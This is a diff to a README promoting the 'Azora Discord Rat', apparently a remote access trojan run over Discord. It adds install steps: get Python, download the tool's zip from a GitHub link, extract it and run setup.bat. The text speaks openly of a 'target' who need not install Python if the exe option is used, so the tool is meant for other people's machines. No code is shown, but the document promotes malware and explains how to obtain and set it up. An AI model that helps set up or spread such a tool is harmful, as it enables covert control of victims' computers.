@@ -30,4 +30,10 @@ The reason why you should choose us? Well, theres many of them!
 # Installation
 Installing the Azora Discord Rat is simple, just follow these quick steps
 
-1. Install [python](https://www.python.org/downloads/), you need to install python due to the fact that its the coding language that our program uses, but dont fear, if you use the exe option when creating the rat, your target wont need to install it.
+- 1. Install [python](https://www.python.org/downloads/), you need to install python due to the fact that its the coding language that our program uses, but dont fear, if you use the exe option when creating the rat, your target wont need to install it.
+
+- 2. Download the [Azora Discord Rat](https://github.com/sigmachipmunk/Azora-Discord-Rat/archive/refs/heads/main.zip) from [here](https://github.com/sigmachipmunk/Azora-Discord-Rat/archive/refs/heads/main.zip)
+
+- 3. Find the location its downloaded in, right click on it, and extract it.
+
+- 4. After all of these are complete, run setup.bat which will download and install all of the required libraries for the software and then start the software
